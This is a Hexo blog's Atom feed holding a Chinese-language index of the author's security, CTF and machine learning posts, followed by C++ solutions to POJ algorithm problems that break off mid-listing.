<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-07-28T07:13:37.268Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://yoursite.com/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://yoursite.com/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2017-07-28T07:13:37.268Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Book"><a href="#Book" class="headerlink" title="Book"></a>Book</h1><ul>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="external">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="external">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="external">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/" target="_blank" rel="external">利用PHP的OPcache机制getshell</a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/" target="_blank" rel="external">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="external">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/" target="_blank" rel="external">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/" target="_blank" rel="external">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/" target="_blank" rel="external">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/" target="_blank" rel="external">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/" target="_blank" rel="external">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/" target="_blank" rel="external">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/" target="_blank" rel="external">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/" target="_blank" rel="external">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/" target="_blank" rel="external">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/" target="_blank" rel="external">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/" target="_blank" rel="external">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/" target="_blank" rel="external">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="external">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/" target="_blank" rel="external"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/" target="_blank" rel="external">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/" target="_blank" rel="external">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/" target="_blank" rel="external">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/" target="_blank" rel="external">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/" target="_blank" rel="external">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/" target="_blank" rel="external">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/" target="_blank" rel="external">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/" target="_blank" rel="external">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/" target="_blank" rel="external">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/" target="_blank" rel="external">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/" target="_blank" rel="external">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/" target="_blank" rel="external">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/" target="_blank" rel="external">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/" target="_blank" rel="external">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/" target="_blank" rel="external">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/" target="_blank" rel="external">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/" target="_blank" rel="external">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/" target="_blank" rel="external">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/" target="_blank" rel="external">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/" target="_blank" rel="external">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ACM-OJ[长期更新]</title>
    <link href="http://yoursite.com/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
    <id>http://yoursite.com/3017/06/19/ACM-OJ-长期更新/</id>
    <published>3017-06-19T08:40:18.000Z</published>
    <updated>2017-06-21T11:42:49.022Z</updated>
    
    <content type="html"><![CDATA[<p>最近更新日期：2017-06-21<br>干脆把自己平日做的题放在一篇文章里吧。不然太分散了。<br>POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617<br>XOJ: 1004 1005 1022 1061 1062 1075 1078 1316<br><a id="more"></a></p>
<h1 id="POJ"><a href="#POJ" class="headerlink" title="POJ"></a>POJ</h1><h2 id="1163"><a href="#1163" class="headerlink" title="1163"></a>1163</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1163" target="_blank" rel="external">http://poj.org/problem?id=1163</a></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>见下面POJ-3176题分析</p>
<h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 355</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> way[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> triangle[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;triangle[i][j]);</div><div class="line"></div><div class="line">    way[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ( j == <span class="number">0</span> )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( j == i )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j<span class="number">-1</span>] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                way[i][j] = max(way[i<span class="number">-1</span>][j],way[i<span class="number">-1</span>][j<span class="number">-1</span>]) + triangle[i][j];</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    <span class="keyword">int</span> lastrow = n - <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res = way[lastrow][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</div><div class="line">        <span class="keyword">if</span> (way[lastrow][j] &gt; res )</div><div class="line">            res = way[lastrow][j];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1258"><a href="#1258" class="headerlink" title="1258"></a>1258</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1258" target="_blank" rel="external">http://poj.org/problem?id=1258</a></p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>最小生成树。</p>
<h3 id="提交-1"><a href="#提交-1" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 105</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> cost[MAX][MAX] ;</div><div class="line"><span class="keyword">int</span> mincost[MAX];</div><div class="line"><span class="keyword">bool</span> used[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        mincost[i] = INF;</div><div class="line">        used[i] = <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    mincost[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( <span class="literal">true</span> )&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> u = <span class="number">0</span>; u &lt; n; u++)&#123;</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || mincost[u] &lt; mincost[v]))</div><div class="line">                v = u;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( v == <span class="number">-1</span> )</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line">        res += mincost[v];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> u = <span class="number">0</span>; u &lt; n; u++)</div><div class="line">            mincost[u] = min(mincost[u], cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> res;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n) != EOF )&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</div><div class="line">                cost[i][j] = INF;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n ; j++)</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,prim());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1273"><a href="#1273" class="headerlink" title="1273"></a>1273</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1273" target="_blank" rel="external">http://poj.org/problem?id=1273</a></p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>模板题目，直接求最大流就可以。<br>我用了vector来构造邻接表，而这题的输入时一次包含了很多个测试例子。所以每次读完后都需要对邻接表进行初始化，即进行下面的操作：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++ )</div><div class="line">	G[i].clear();</div></pre></td></tr></table></figure></p>
<p>方法是网上找的，网上说这样清空了元素，但不会回收内存。</p>
<h3 id="提交-2"><a href="#提交-2" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 205</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x7fffffff</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123;<span class="keyword">int</span> to ,cap, rev;&#125;;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX];</div><div class="line"><span class="keyword">bool</span> used[MAX];</div><div class="line"><span class="keyword">int</span> n,m;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_edge</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> to,<span class="keyword">int</span> cap)</span></span>&#123;</div><div class="line">    edge one,two;</div><div class="line">    one.to = to;</div><div class="line">    one.cap = cap;</div><div class="line">    one.rev = (<span class="keyword">int</span>)(G[to].size());</div><div class="line">    G[from].push_back(one);</div><div class="line">    two.to = from;</div><div class="line">    two.cap = <span class="number">0</span>;</div><div class="line">    two.rev = (<span class="keyword">int</span>)(G[from].size()<span class="number">-1</span>);</div><div class="line">    G[to].push_back(two);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> v, <span class="keyword">int</span> t, <span class="keyword">int</span> f)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> ( v == t)</div><div class="line">        <span class="keyword">return</span> f;</div><div class="line">    used[v] = <span class="literal">true</span>;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)G[v].size(); i++)&#123;</div><div class="line">        edge &amp;e = G[v][i];</div><div class="line">        <span class="keyword">if</span> ( !used[e.to] &amp;&amp; e.cap &gt; <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">int</span> d = dfs(e.to,t, f &gt; e.cap?e.cap:f);</div><div class="line">            <span class="keyword">if</span> 